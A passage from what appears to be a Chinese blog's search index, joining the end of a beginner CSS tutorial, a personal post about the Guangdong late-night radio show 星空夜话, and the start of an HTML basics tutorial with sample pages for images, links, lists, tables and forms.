单位： 1em = 当前一个字体的大小 */text-indent: 2em; 设置颜色的方式123456789/* 第一种方式: 用单词的方式 */color: blue;/* 第二种方式: 十进制的方式 */color: rgb(183, 155, 55);/* 第三种方式: 十六进制的方式 */color: #ff0000;/* 基于第三种方式，当三种颜色每两位的数值都相同，则可以简写 */color: #f40;color: #f00; 盒子的基本三属性盒子指的就是标签，在网页中都是由一个一个大大小小的盒子组成，其中的三个基本属性如下： width：宽度 height：高度 background：背景色 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;盒子的基本三属性&lt;/title&gt; &lt;style type="text/css"&gt; div { /* 宽度 */ width: 200px; /* 高度 */ height: 200px; /* 背景色 */ background: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 显示模式三种显示模式提示 盒子的显示模式属于块级显示模式 块级显示模式 独占一行显示，设置宽高后起作用；在没有设置宽度的时候，其默认宽度与父元素的宽度一致，而默认高度是 0 拥有块级显示模式的元素（标签）：&lt;html&gt;、&lt;body&gt;、&lt;div&gt;、&lt;h1&gt; - &lt;h6&gt;、&lt;p&gt;、&lt;ul&gt;、&lt;ol&gt;、&lt;li&gt;、&lt;dl&gt;、&lt;dt&gt;、&lt;dd&gt;、&lt;hr&gt;、&lt;form&gt; 行内显示模式 一行有多个元素（标签），设置宽高不会起作用，尺寸由内容大小决定；在没有设置内容时，其默认宽度和高度都是 0；当行内元素有一个及以上的空格符或者换行符时，显示效果之前会有一个默认的间距 拥有行内显示模式的元素（标签）：&lt;span&gt;、&lt;b&gt;、&lt;i&gt;、&lt;s&gt;、&lt;u&gt;、&lt;strong&gt;、&lt;em&gt;、&lt;del&gt;、&lt;ins&gt; 行内块显示模式： 行内块显示模式：即一行有多个元素（标签），设置宽高后会起作用 行内块显示模式的元素（标签）：&lt;img&gt;、表单标签（例如 &lt;input&gt;、&lt;textarea&gt;） 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;显示模式&lt;/title&gt; &lt;style type="text/css"&gt; div { /* 宽度 */ width: 200px; /* 高度 */ height: 200px; /* 背景色 */ background: blue; } i { background: red; } span { background: blue; } img { width: 60px; height: 60px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;&lt;/div&gt; &lt;i&gt;镇&lt;/i&gt; &lt;i&gt;镇&lt;/i&gt; &lt;span&gt;上&lt;/span&gt; &lt;span&gt;上&lt;/span&gt; &lt;img src="https://dss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/skin/29.jpg" /&gt; &lt;img src="https://dss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/skin/29.jpg" /&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： 显示模式转换 显示模式转换 其它显示模式转换成块级显示模式: display: block 其它显示模式转换成行内块显示模式: display: inline-block 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;显示模式转换&lt;/title&gt; &lt;style type="text/css"&gt; div { /* 宽度 */ width: 200px; /* 高度 */ height: 200px; /* 背景色 */ background: blue; /* 转换成行内块显示模式 */ display: inline-block; } span { /* 宽度 */ width: 100px; /* 高度 */ height: 100px; /* 背景色 */ background: red; /* 转换成行内块显示模式 */ display: inline-block; } b { /* 宽度 */ width: 100px; /* 高度 */ height: 100px; /* 背景色 */ background: yellow; /* 转换成块级显示模式 */ display: block; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;b&gt;&lt;/b&gt; &lt;b&gt;&lt;/b&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： 选择器标签选择器 标签选择器 定义的语法： 标签名 { 属性1; 属性2; ...} 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;标签选择器&lt;/title&gt; &lt;style type="text/css"&gt; h1 { color: red; } h2 { color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Java&lt;/h1&gt; &lt;h2&gt;Python&lt;/h2&gt; &lt;h2&gt;JavaScript&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 类选择器 类选择器 定义类名：用点开头 + 类名称 调用类名：用标签的 class 属性指定类名 类名的命名规范：不能用数字开头，可以用字母或者下划线开头，后面可以加上字母、数字、下划线、中划线 建议使用驼峰命名法：第一个单词首字母小写，从第二个单词开始首字母大写 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;类选择器&lt;/title&gt; &lt;style type="text/css"&gt; .red { color: red; } .blue { color: blue; } .green { color: green; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 class="red"&gt;Java&lt;/h1&gt; &lt;h2 class="blue"&gt;Python&lt;/h2&gt; &lt;h2 class="green"&gt;JavaScript&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; ID 选择器 ID 选择器 定义 ID 名称：用 # 开头 + ID 名称 调用 ID 名称：用标签的 id 属性指定 ID 名称 唯一性：标签的 id 属性指定的 ID 名称一般全局唯一 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf=8"&gt; &lt;title&gt;ID选择器&lt;/title&gt; &lt;style type="text/css"&gt; #one { color: red; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 id="one"&gt;Hello Wolrd!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 多类名调用当一个代码片段重复性的出现时，会造成代码执行效率降低，此时可以使用多类名调用来解决代码冗余问题。多类名调用的语法：标签可以调用多个类名，类名之间用空格隔开。 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="\'utf-8"&gt; &lt;title&gt;多类名调用&lt;/title&gt; &lt;style type="text/css"&gt; .font { font-size: 80px; } .red { color: #DB4732; } .blue { color: #1B6FEF; } .green { color: #009A57; } .yellow { color: #FFD669; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;span class="blue font"&gt;G&lt;/span&gt;&lt;span class="red font"&gt;o&lt;/span&gt;&lt;span class="yellow font"&gt;o&lt;/span&gt;&lt;span class="blue font"&gt;g&lt;/span&gt;&lt;span class="green font"&gt;l&lt;/span&gt;&lt;span class="red font"&gt;e&lt;/span&gt;&lt;/body&gt;&lt;/html&gt; 后代选择器 使用空格分隔多个选择器 空格表示后代，空格后面的选择器是后代选择器 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;后代选择器&lt;/title&gt; &lt;style text="text/css"&gt; .backend h1 { color: blue; } .backend .go { color: blueviolet; } .backend div h3 { color: green; } .fontend h1 { color: red; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="backend"&gt; &lt;h1&gt;后端&lt;/h1&gt; &lt;h3 class="go"&gt;Go&lt;/h3&gt; &lt;h3&gt;PHP&lt;/h3&gt; &lt;h3&gt;Java&lt;/h3&gt; &lt;h3&gt;Python&lt;/h3&gt; &lt;div&gt; &lt;h3&gt;C#&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="fontend"&gt; &lt;h1&gt;前端&lt;/h1&gt; &lt;h3&gt;Vue&lt;/h3&gt; &lt;h3&gt;NodeJs&lt;/h3&gt; &lt;h3&gt;Webpack&lt;/h3&gt; &lt;h3&gt;TypeScript&lt;/h3&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 并集选择器 并集选择器：将多个选择器使用逗号隔开，实现共同的属性设置 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="“utf-8"&gt; &lt;title&gt;并集选择器&lt;/title&gt; &lt;style type="text/css"&gt; span, p, h1 { color: red; } .box h2, .box h3 { color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;span&gt;span&lt;/span&gt; &lt;p&gt;段落&lt;/p&gt; &lt;h1&gt;标题1&lt;/h1&gt; &lt;h2&gt;标题2&lt;/h2&gt; &lt;h3&gt;标题3&lt;/h3&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; CSS 书写位置 CSS 的书写位置 第一种：内嵌式，在工作中偶尔会使用 第二种：行内式，在工作中偶尔会使用 第三种：外链式，在工作中经常会使用（推荐） 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;&lt;/title&gt; &lt;!-- 第一种：内嵌式，是将CSS代码嵌入到HTML文件中，CSS代码和HTML代码相对分离，代码耦合度相对较低，在工作中偶尔会使用 --&gt; &lt;style type="text/CSS"&gt; .one { color:red; } &lt;/style&gt; &lt;!-- 第三种：外链式，是将CSS代码单独写在CSS文件中，CSS代码和HTML代码绝对分离，代码耦合度极低，在工作中经常会使用 --&gt; &lt;link rel="stylesheet" type="text/css" href="one.css" /&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 第二种：行内式，是将CSS代码写在HTML中，两种代码掺杂在一起，代码耦合很高，会有代码冗余，且难以维护，在工作中偶尔会使用 --&gt; &lt;div style="width: 100px; height: 100px; background: red;"&gt;我是div&lt;/div&gt; &lt;div style="width: 100px; height: 100px; background: yellow;"&gt;我是div&lt;/div&gt; &lt;div style="width: 100px; height: 100px; background: yellow;"&gt;我是div&lt;/div&gt; &lt;div style="width: 100px; height: 100px; background: yellow;"&gt;我是div&lt;/div&gt; &lt;div style="width: 100px; height: 100px; background: yellow;"&gt;我是div&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; CSS 层叠性层叠性基础 CSS 层叠性 不同的属性都可以实现定义 相同的属性，且在权重相同时，后定义的会层叠（覆盖）先定义的 在权重不同时，谁的权重值高，则实现谁的，权重规则为： 标签选择器 &lt; 类选择器 &lt; ID 选择器 &lt; 行内样式 &lt; !important 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;层叠性&lt;/title&gt; &lt;style type="text/css"&gt; #gray { color: gray; } .pink { color: pink; } .green { color: green; } div { color: red !important; font-family: "宋体"; } div { font-size: 40px; } div { font-weight: 700; color: blue; } div { font-size: 50px; color: yellow; text-align: center; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="pink green" id="gray" style="color:skyblue"&gt;我是div&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： 层叠性进阶CSS 的三种书写位置，都遵循上面介绍的层叠性规则。 one.css 123.div { color: red;} demo.html 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;层叠性&lt;/title&gt; &lt;link rel="stylesheet" type="text/css" href="./one.css"&gt;&lt;/link&gt; &lt;style type="text/css"&gt; div { color: green; font-size: 50px; text-align: center; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="div"&gt;我是div&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： CSS 继承性 标签可以继承父元素关于文本设置的属性（不包括 width、height 等属性），继承的权重是最低的（等价于 0） &lt;a&gt; 标签默认设置了 color、cursor 等属性，继承得到的颜色会被 &lt;a&gt; 标签自身的属性层叠（覆盖） 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;CSS 的继承性&lt;/title&gt; &lt;style text="text/css"&gt; .box { color: red; font-size: 30px; width: 300px; height: 300px; background-color: pink; } p { color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;span&gt;Css&lt;/span&gt; &lt;i&gt;Html&lt;/i&gt; &lt;p&gt;JavaScript&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： 状态伪类 状态伪类：权重是 10，当四个状态同时存在时，要遵循 lvha 顺序 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;状态伪类&lt;/title&gt; &lt;style type="text/css"&gt; a { font-size: 20px; } /* 超链接未点击 */ a:link { color: orange; } /* 超链接已点击 */ a:visited { color: gray; } /* 超链接获取焦点 */ a:hover { color: black; } /* 超链接被点击 */ a:active { color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;a href="##"&gt;超链接&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;常用的两种状态伪类&lt;/title&gt; &lt;style type="text/css"&gt; .baidu { color: blue; font-size: 20px; } .baidu:hover { color: orange; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;a href="https://www.baidu.com" class="baidu"&gt;超链接&lt;/a&gt; &lt;a href="##"&gt;超链接&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 块元素默认宽度块元素在不设置固定宽度时，其默认的宽度和父元素的宽度一样，适用于块元素标签：&lt;html&gt;、&lt;body&gt;、&lt;div&gt;、&lt;h1&gt; - &lt;h6&gt;、&lt;p&gt;、&lt;ul&gt;、&lt;ol&gt;、&lt;li&gt;、&lt;dl&gt;、&lt;dt&gt;、&lt;dd&gt;、&lt;hr&gt;、&lt;form&gt;。 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf=8"&gt; &lt;title&gt;块元素默认宽度&lt;/title&gt; &lt;style type="text/css"&gt; .one { width: 200px; height: 200px; background-color: red; } .two { height: 100px; background-color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="one"&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： text-aligin 水平居中 text-align 能让标签内的文本、行内元素、行内块元素水平居中，但不能让标签内的块元素水平居中 若希望让文本、行内元素、行内块元素水平居中，则需要给它们的父元素设置一定的宽度 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf8"&gt; &lt;title&gt;text-align 能让什么水平居中显示&lt;/title&gt; &lt;style type="text/css"&gt; h1 { background-color: pink; text-align: center; width: 500px; } img { width: 50px; height: 50px; } .box { width: 300px; height: 300px; text-align: center; background-color: yellow; } .one { width: 100px; height: 100px; background-color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;标题&lt;/h1&gt; &lt;div class="box"&gt; &lt;b&gt;我是 Box&lt;/b&gt; &lt;img src="https://dss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/skin/29.jpg" /&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上述代码，在浏览器运行的效果如下： var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"电台 FM91.4 - 星空夜话",url:"/posts/7263da5.html",text:'最新公告 电台节目《星空夜话》 于 2021 年 2 月正式恢复播出，主持人是黄纬，电台收听频段依旧是 91.4（仅限广深佛），播出时段是 22:30 - 00:00（周一～周五）。 序言 偶然的情况下在豆瓣上看到了文章 - 我很想念《星空夜话》，跟作者一样也是《星空夜话》的忠实听众，于是有了以下的碎碎念。 节目历史 《星空夜话》是广东新闻广播推出的深夜情感电台节目，电台收听频段是 91.4（仅限广深佛），播出时段是 22:15 - 00:00（周一～周五）。这档节目最初的名称是《谈情谈到十二点》，而《谈情谈到十二点》的前身是午间版的《男生女生配》。最初的节目主持人是吕囡囡，后来节目改版了，吕囡囡和孙潇毅开始搭档主持节目，记忆犹新的是节目改版后，片头的那句 “我们总有故事发生”。忘了过了多久，孙潇毅后来离开了《星空夜话》，转去做音乐电台，然后就再也没在《星空夜话》里出现过了。后来男主播黄纬加入《星空夜话》，与吕囡囡轮流主持节目。可惜吕囡囡在 2015.03.21 主持完最后一期节目后也离开了《星空夜话》，转去做午间节目《微博大视野》，刚好那段时间吕囡囡结婚了（三个月闪婚），记得最后那期（2015.03.21）节目的主题是《以最骄傲的姿态离开》。最后，《星空夜话》就剩下黄纬在继续主持节目了。 在线收听 若希望在线收听《星空夜话》的历史节目或者最新节目，手机可以下载安装 APP 蜻蜓 FM，然后在 APP 内搜索 "星空夜话" 即可。如果喜欢主播黄纬的声音，还可以在 蜻蜓 FM 上收听节目 《随风潜入夜》，或者关注主播的微信公众号 fm0424。 星空记忆 记得第一次收听《星空夜话》是在读初二的时候，距今大概也有 15 年了；在那个少有 MP3、手机的学生时代，用的是便携式收音机收听。那时候比较懵懂，也不知道为什么后来就慢慢喜欢上了这档电台节目，尤其喜欢节目主持人吕囡囡的声音。初中到高中一直都在听，不过读大学和工作后收听的频率就低了很多，只是偶尔在失眠或者情绪低落的时候才会听一下。 博客说明 在 PC 端访问当前博客时，网页左下角的音乐播放器列表里会有《星空夜话》的节目，音频来源于 蜻蜓 FM，节目播出日期是从 2014.09.24 到 2017.03.29，每次刷新页面都会从 477 期的节目中随机抽取若干期节目，这算是对《星空夜话》的一种纪念。由于音频的版权原因，此功能暂时停用。 宣传图片 附上《星空夜话》的宣传图片 微信群 日后希望有机会建一个《星空夜话》的微信群，若听友感兴趣可以扫描下方的微信群二维码，加入到群里和小伙伴们一起分享自己的星空经历。由于微信群二维码存在有效期，若过期了你可以在下方的评论区留言，建议留言的时候在邮箱的输入框内填写你的邮箱地址，笔者会通过邮件联系你并邀请你加入星空夜话的微信群。因为在下方评论区留言后，评论区默认是不会显示你的邮箱地址，只有笔者能在后台看到，所以你不用担心个人隐私泄漏的问题。',tags:"生活随笔"},{title:"前端入门基础之 HTML 与 CSS 之一",url:"/posts/838fe3ef.html",text:'前言Web 标准Web 标准是由 W3C（万维网联盟组织）组织制定，包括以下三部分： 结构: HTML 表现: CSS 行为: JavaScript 浏览器内核 IE: trident 内核 Firefox: gecko 内核 Opear: webkit 内核 Safari: webkit 内核 Chrome: blink 内核，属于 webkit 内核的一个分支 HTML 发展史 提示 HTML5 是一个新的 HTML 版本，新增了一些标签和功能，适用于高级浏览器。H5 开发是一个泛指，指的就是移动端页面开发的意思。 HTML 基础HTML 标签标签的类型 单标签：自结束标签，例如: &lt;meta&gt; 双标签：有开始有闭合的标签，例如：&lt;html&gt;&lt;/html&gt; 标签的关系 并列关系：同级关系，是兄弟之间的关系 嵌套关系：包含关系，是祖先和后代之间的关系 基本标签 &lt;!DOCTYPE html&gt;：文档类型的声明，让浏览器按照相应版本的 HTML 进行解析 &lt;html&gt;：网页的根标签，所有其它的标签都被包含在里面 &lt;head&gt;：头部标签，关于网页的一些配置信息 &lt;meta charset="utf-8"&gt;：字符集设置或者叫编码设置，各种字符集编码的说明可看这里 常用标签 &lt;p&gt;：段落标签 &lt;br&gt;：换行标签 &lt;hr&gt;：水平线标签 &lt;h1&gt; - &lt;h6&gt;：标题标签 &lt;i&gt;、&lt;em&gt;：倾斜标签 &lt;s&gt;、&lt;del&gt;：删除标签 &lt;u&gt;、&lt;ins&gt;：下划线标签 &lt;b&gt;、&lt;strong&gt;：加粗标签 提示 标签基本都具备一定的语义，爬虫引擎会根据标签语义来获取文本信息 &lt;em&gt;、&lt;del&gt;、&lt;ins&gt;、&lt;strong&gt; 这些标签，除了具备显示效果之外，更强调语义 图片标签 插入图片和设置背景图的区别 插入图片是使用 &lt;img&gt; 标签，标签在网页中是占位置的，而设置背景图是靠属性 background。由于属性是不占位置的，可以简单认为背景图就是一个丰富多彩的背景颜色，背景图的尺寸与标签的尺寸无关。 123456789&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;背景图&lt;/title&gt; &lt;/head&gt; &lt;body style="background: url(https://dss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/skin/29.jpg) no-repeat; background-size: 100% 100%; background-attachment: fixed;"&gt; &lt;/body&gt;&lt;/html&gt; 图片不存在时显示默认图片 当图片加载失败时，可以通过 onerror 属性指定默认显示的图片，使用示例如下： 1&lt;img src="https://www.example.cn/img/head.jpg" onerror="javascript:this.src=\'https://qiniu.example.cn/gif/loading.gif\'" &gt; 或者指定默认的 Base64 图片： 1&lt;img src="https://www.example.cn/img/head.jpg" onerror="javascript:this.src=\'data:image/gif;base64,R0lGODlhDAEMAfcBMQAAAADXXXXXXXXXXXXXXXXXXXXX\'"&gt; 路径绝对路径提示 路径是指网页和其他文件的位置关系，出于安全考虑，浏览器不允许直接通过绝对路径访问本地磁盘中的文件。 相对路径同级相对路径1&lt;img src="phone.jpg"&gt; 下级相对路径 链接超链接 空链接当没有想好链接跳转到哪个网页时，则可以设置成空链接。空链接写一个 # 时，点击后会返回顶部，通常会写两个 ##。 1&lt;a href="##"&gt; 锚点链接在网页内部进行跳转，需要给目标链接标签设置 id 属性。可以通过 &lt;a&gt; 标签中的 href 属性，使用 #id 来关联 id 属性的值。 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;锚点链接&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;段落&lt;/p&gt; &lt;p&gt;段落&lt;/p&gt; &lt;font color="blue" id="level1"&gt;第一层&lt;/font&gt; &lt;p&gt;段落&lt;/p&gt; &lt;p&gt;段落&lt;/p&gt; &lt;font color="blue" id="level2"&gt;第二层&lt;/font&gt; &lt;p&gt;段落&lt;/p&gt; &lt;p&gt;段落&lt;/p&gt; &lt;a href="#level1"&gt;跳转第一层&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 列表无序列表123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;无序列表&lt;/h3&gt; &lt;ul&gt; &lt;li&gt;商品一&lt;/li&gt; &lt;li&gt;商品二&lt;/li&gt; &lt;li&gt;商品二&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 有序列表123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;有序列表&lt;/h3&gt; &lt;ol&gt; &lt;li&gt;商品一&lt;/li&gt; &lt;li&gt;商品二&lt;/li&gt; &lt;li&gt;商品二&lt;/li&gt; &lt;/ol&gt;&lt;/body&gt;&lt;/html&gt; 自定义列表自定义列表是被一组 dl 管理的列表，dt 是主题，dd 是列表项。其中 dl 只能包含 dt 和 dd，而 dt 和 dd 可以包含其他标签。 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;自定义列表&lt;/h3&gt; &lt;dl&gt; &lt;dt&gt;亚洲&lt;/dt&gt; &lt;dd&gt;中国&lt;/dd&gt; &lt;dd&gt;日本&lt;/dd&gt; &lt;dd&gt;韩国&lt;/dd&gt; &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt; 表格表格基础 标签 table：表格标签 tr：行标签 th：表头标签，内容水平居中且加粗的 td：单元格标签，列默认是以当前列中最宽的为基准 caption：表格标题 属性 width：宽度 height：高度 border：边框宽度 cellspacing：单元格与单元格之间的间距 align：文本的对齐方式：left / 居左、center / 居中、right / 居右 colspan: 跨列合并单元格 rowspan: 跨行合并单元格 表格实战通过 table 标签实现课程表（如下所示）： ★展开案例代码★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;课程表&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;table border="1px" width="800px" height="300px" cellspacing="0"&gt; &lt;caption&gt; &lt;h2&gt;课程表&lt;/h2&gt; &lt;/caption&gt; &lt;tr align="center" bgcolor="red"&gt; &lt;th&gt;项目&lt;/th&gt; &lt;th colspan="5"&gt;上课&lt;/th&gt; &lt;th colspan="2"&gt;休息&lt;/th&gt; &lt;/tr&gt; &lt;tr align="center" bgcolor="#00BFFF"&gt; &lt;td&gt;星期&lt;/td&gt; &lt;td&gt;星期一&lt;/td&gt; &lt;td&gt;星期二&lt;/td&gt; &lt;td&gt;星期三&lt;/td&gt; &lt;td&gt;星期四&lt;/td&gt; &lt;td&gt;星期五&lt;/td&gt; &lt;td&gt;星期六&lt;/td&gt; &lt;td&gt;星期日&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td rowspan="4"&gt;上午&lt;/td&gt; &lt;td&gt;语文&lt;/td&gt; &lt;td&gt;数学&lt;/td&gt; &lt;td&gt;体育&lt;/td&gt; &lt;td&gt;生理&lt;/td&gt; &lt;td&gt;情感&lt;/td&gt; &lt;td&gt;电竞&lt;/td&gt; &lt;td rowspan="4"&gt;休息&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td&gt;语文&lt;/td&gt; &lt;td&gt;数学&lt;/td&gt; &lt;td&gt;体育&lt;/td&gt; &lt;td&gt;生理&lt;/td&gt; &lt;td&gt;情感&lt;/td&gt; &lt;td&gt;电竞&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td&gt;语文&lt;/td&gt; &lt;td&gt;数学&lt;/td&gt; &lt;td&gt;体育&lt;/td&gt; &lt;td&gt;生理&lt;/td&gt; &lt;td&gt;情感&lt;/td&gt; &lt;td&gt;电竞&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td&gt;语文&lt;/td&gt; &lt;td&gt;数学&lt;/td&gt; &lt;td&gt;体育&lt;/td&gt; &lt;td&gt;生理&lt;/td&gt; &lt;td&gt;情感&lt;/td&gt; &lt;td&gt;电竞&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td rowspan="2"&gt;下午&lt;/td&gt; &lt;td&gt;语文&lt;/td&gt; &lt;td&gt;数学&lt;/td&gt; &lt;td&gt;体育&lt;/td&gt; &lt;td&gt;生理&lt;/td&gt; &lt;td&gt;情感&lt;/td&gt; &lt;td&gt;电竞&lt;/td&gt; &lt;td rowspan="4"&gt;休息&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td&gt;语文&lt;/td&gt; &lt;td&gt;数学&lt;/td&gt; &lt;td&gt;体育&lt;/td&gt; &lt;td&gt;生理&lt;/td&gt; &lt;td&gt;情感&lt;/td&gt; &lt;td&gt;电竞&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 表单表单基础 表单实战 ★展开案例代码★ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action="#" method="post"&gt; &lt;label for="name"&gt;姓名：&lt;/label&gt; &lt;input type="text" id="name" /&gt; &lt;br&gt;&lt;br&gt; &lt;label for="password"&gt;密码：&lt;/label&gt; &lt;input type="password" id="password" /&gt; &lt;br&gt;&lt;br&gt; 性别： &lt;input type="radio" name="gender" id="man" checked /&gt;&lt;label for="man"&gt;男&lt;/label&gt; &lt;input type="radio" name="gender" id="female" /&gt;&lt;label for="female"&gt;女&lt;/label&gt; &lt;br&gt;&lt;br&gt; 学历： &lt;input type="radio" name="edu" id="edu-level-1" /&gt;&lt;label for="edu-level-1"&gt;中职&lt;/label&gt; &lt;input type="radio" name="edu" id="edu-level-2" /&gt;&lt;label for="edu-level-2"&gt;大专&lt;/label&gt; &lt;input type="radio" name="edu" id="edu-level-3" /&gt;&lt;label for="edu-level-3"&gt;本科&lt;/label&gt; &lt;input type="radio" name="edu" id="edu-level-4" /&gt;&lt;label for="edu-level-4"&gt;硕士&lt;/label&gt; &lt;input type="radio" name="edu" id="edu-level-5" 